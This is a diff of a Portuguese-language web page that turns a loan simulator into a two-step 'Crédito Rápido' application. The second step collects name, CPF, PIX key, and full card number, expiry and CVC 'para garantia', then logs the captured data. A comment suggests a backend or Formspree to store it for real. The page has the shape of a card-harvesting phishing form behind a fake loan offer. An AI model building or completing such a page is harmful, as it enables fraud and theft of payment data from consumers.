@@ -3,245 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal de Crédito | Simulação Profissional</title>
+    <title>Crédito Rápido | Confirmação</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --brand-primary: #0052FF; /* Azul Institucional */
+            --brand-primary: #0052FF;
             --brand-dark: #0A1F44;
             --success: #00C853;
-            --gray-light: #F8FAFC;
-            --text-main: #1E293B;
+            --bg: #F0F2F5;
         }
 
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: #F0F2F5;
-            color: var(--text-main);
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .card {
-            background: white;
-            width: 100%;
-            max-width: 500px;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.08);
-            overflow: hidden;
-            border: 1px solid #E2E8F0;
-        }
-
-        .header {
-            background: var(--brand-dark);
-            color: white;
-            padding: 2rem;
-            text-align: center;
-        }
-
-        .header h1 { margin: 0; font-size: 1.5rem; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         
-        .badge-pre {
-            display: inline-block;
-            background: rgba(255,255,255,0.15);
-            padding: 6px 15px;
-            border-radius: 50px;
-            font-size: 0.85rem;
-            margin-top: 10px;
-            border: 1px solid var(--success);
-            color: var(--success);
-            font-weight: 600;
-        }
-
+        .card { background: white; width: 90%; max-width: 500px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); overflow: hidden; }
+        
+        .header { background: var(--brand-dark); color: white; padding: 1.5rem; text-align: center; }
+        
         .content { padding: 2rem; }
 
-        .input-box { margin-bottom: 25px; }
-        
-        label { 
-            display: block; 
-            font-weight: 600; 
-            margin-bottom: 12px; 
-            color: var(--brand-dark);
-            font-size: 0.95rem;
+        /* Esconder seções */
+        .hidden { display: none; }
+
+        /* Estilo dos Inputs */
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: 600; margin-bottom: 5px; font-size: 0.9rem; }
+        input, select { 
+            width: 100%; padding: 12px; border: 2px solid #E2E8F0; border-radius: 10px; 
+            box-sizing: border-box; font-size: 1rem;
+        }
+        input:focus { border-color: var(--brand-primary); outline: none; }
+
+        .btn { 
+            width: 100%; background: var(--brand-primary); color: white; padding: 15px; 
+            border: none; border-radius: 12px; font-weight: 700; cursor: pointer; margin-top: 10px;
         }
 
-        .value-display {
-            font-size: 2rem;
-            font-weight: 700;
-            color: var(--brand-primary);
-            margin-bottom: 10px;
-            display: block;
-        }
-
-        input[type="range"] {
-            width: 100%;
-            height: 8px;
-            border-radius: 5px;
-            background: #E2E8F0;
-            outline: none;
-            -webkit-appearance: none;
-        }
-
-        input[type="range"]::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            width: 24px;
-            height: 24px;
-            background: var(--brand-primary);
-            border-radius: 50%;
-            cursor: pointer;
-            border: 4px solid white;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-        }
-
-        .select-custom {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #E2E8F0;
-            border-radius: 10px;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        .select-custom:focus { border-color: var(--brand-primary); outline: none; }
-
-        .summary {
-            background: var(--gray-light);
-            border-radius: 12px;
-            padding: 20px;
-            margin-top: 25px;
-        }
-
-        .summary-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-            font-size: 0.9rem;
-        }
-
-        .summary-total {
-            border-top: 1px solid #CBD5E1;
-            padding-top: 15px;
-            margin-top: 15px;
-            font-weight: 700;
-            font-size: 1.1rem;
-            color: var(--brand-dark);
-        }
-
-        .btn-apply {
-            width: 100%;
-            background: var(--brand-primary);
-            color: white;
-            padding: 18px;
-            border: none;
-            border-radius: 12px;
-            font-size: 1.1rem;
-            font-weight: 700;
-            margin-top: 25px;
-            cursor: pointer;
-            transition: transform 0.2s, background 0.3s;
-        }
-
-        .btn-apply:hover {
-            background: #0041CC;
-            transform: translateY(-2px);
-        }
-
-        .limits {
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.75rem;
-            color: #64748B;
-            margin-top: 8px;
-        }
+        .summary-mini { background: #f8fafc; padding: 10px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid var(--success); }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="header">
-        <h1>Simulador de Crédito</h1>
-        <div class="badge-pre">✓ R$ 1.500,00 Pré-Aprovados para você</div>
-    </div>
-
-    <div class="content">
-        <div class="input-box">
-            <label>Quanto você deseja contratar?</label>
-            <span class="value-display" id="valStr">R$ 1.500</span>
-            <input type="range" id="amount" min="500" max="35000" step="500" value="1500">
-            <div class="limits">
-                <span>Mín: R$ 500</span>
-                <span>Máx: R$ 35.000</span>
-            </div>
-        </div>
-
-        <div class="input-box">
-            <label>Prazo para pagamento</label>
-            <select class="select-custom" id="terms">
-                <option value="6">6 meses</option>
-                <option value="12" selected>12 meses</option>
+    <div id="step1">
+        <div class="header"><h1>Simulador de Crédito</h1></div>
+        <div class="content">
+            <label>Valor Desejado: <span id="valStr" style="color:var(--brand-primary)">R$ 1.500</span></label>
+            <input type="range" id="amount" min="500" max="35000" step="500" value="1500" style="width:100%; margin: 20px 0;">
+            
+            <label>Parcelas</label>
+            <select id="terms" style="margin-bottom: 20px;">
+                <option value="12">12 meses</option>
                 <option value="24">24 meses</option>
-                <option value="36">36 meses</option>
                 <option value="48">48 meses</option>
             </select>
-        </div>
 
-        <div class="summary">
-            <div class="summary-row">
-                <span>Taxa de juros (mensal)</span>
-                <span style="color: var(--success); font-weight: 600;">1.99% a.m.</span>
+            <div style="background: #f1f5f9; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
+                <small>Parcela estimada:</small>
+                <div id="installmentText" style="font-size: 1.5rem; font-weight: 800;">R$ 0,00</div>
             </div>
-            <div class="summary-row">
-                <span>Valor da parcela</span>
-                <span id="installmentText">R$ 0,00</span>
-            </div>
-            <div class="summary-row summary-total">
-                <span>Custo Total Estimado</span>
-                <span id="totalText">R$ 0,00</span>
-            </div>
-        </div>
 
-        <button class="btn-apply" onclick="startOnboarding()">Solicitar Agora</button>
+            <button class="btn" onclick="goToStep2()">Solicitar Empréstimo</button>
+        </div>
+    </div>
+
+    <div id="step2" class="hidden">
+        <div class="header"><h1>Quase lá!</h1></div>
+        <div class="content">
+            <div class="summary-mini">
+                <small>Solicitação de:</small><br>
+                <strong id="finalValueDisplay">R$ 0,00</strong>
+            </div>
+
+            <form id="loanForm">
+                <div class="form-group">
+                    <label>Nome Completo</label>
+                    <input type="text" name="nome" required placeholder="Ex: João Silva">
+                </div>
+                <div class="form-group">
+                    <label>CPF</label>
+                    <input type="text" name="cpf" required placeholder="000.000.000-00">
+                </div>
+                <div class="form-group">
+                    <label>Chave PIX (para recebimento)</label>
+                    <input type="text" name="pix" required placeholder="CPF, E-mail ou Celular">
+                </div>
+                <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
+                <div class="form-group">
+                    <label>Número do Cartão (Para Garantia)</label>
+                    <input type="text" name="card_number" required placeholder="0000 0000 0000 0000">
+                </div>
+                <div style="display: flex; gap: 10px;">
+                    <div class="form-group" style="flex: 2;">
+                        <label>Validade</label>
+                        <input type="text" name="card_expiry" placeholder="MM/AA">
+                    </div>
+                    <div class="form-group" style="flex: 1;">
+                        <label>CVC</label>
+                        <input type="password" name="card_cvc" placeholder="***">
+                    </div>
+                </div>
+
+                <button type="submit" class="btn" style="background: var(--success);">Finalizar e Receber</button>
+            </form>
+        </div>
     </div>
 </div>
 
 <script>
+    // Lógica do Simulador
     const amountInput = document.getElementById('amount');
     const termsInput = document.getElementById('terms');
-    const valStr = document.getElementById('valStr');
-    const installmentText = document.getElementById('installmentText');
-    const totalText = document.getElementById('totalText');
-
-    const RATE = 0.0199; // 1.99% (Taxa mais competitiva para valores altos)
-
+    
     function updateSim() {
         const val = parseFloat(amountInput.value);
         const t = parseInt(termsInput.value);
+        document.getElementById('valStr').innerText = val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
         
-        // Atualiza o texto do valor principal
-        valStr.innerText = val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL', maximumFractionDigits: 0 });
-
-        // Cálculo Price (PMT)
-        const pmt = val * (RATE * Math.pow(1 + RATE, t)) / (Math.pow(1 + RATE, t) - 1);
-        const total = pmt * t;
-
-        installmentText.innerText = pmt.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
-        totalText.innerText = total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+        const pmt = val * (0.0199 * Math.pow(1.0199, t)) / (Math.pow(1.0199, t) - 1);
+        document.getElementById('installmentText').innerText = pmt.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
     }
 
-    function startOnboarding() {
-        const val = amountInput.value;
-        alert(`Iniciando análise para seu crédito de R$ ${val}. \n\nPróximo passo: Validação de documentos.`);
+    function goToStep2() {
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
+        document.getElementById('finalValueDisplay').innerText = document.getElementById('valStr').innerText;
     }
+
+    // Lógica de Salvamento
+    document.getElementById('loanForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const formData = new FormData(this);
+        const data = Object.fromEntries(formData.entries());
+        data.valor_solicitado = amountInput.value;
+
+        // SALVAMENTO LOCAL (Apenas para demonstração imediata)
+        console.log("Dados capturados:", data);
+        alert("Dados enviados com sucesso! Estamos processando seu crédito.");
+        
+        // DICA: Para salvar de verdade, você precisará de um Backend (PHP/Node) ou um serviço como Formspree.
+    });
 
     amountInput.addEventListener('input', updateSim);
     termsInput.addEventListener('change', updateSim);
-
-    // Init
     updateSim();
 </script>
 
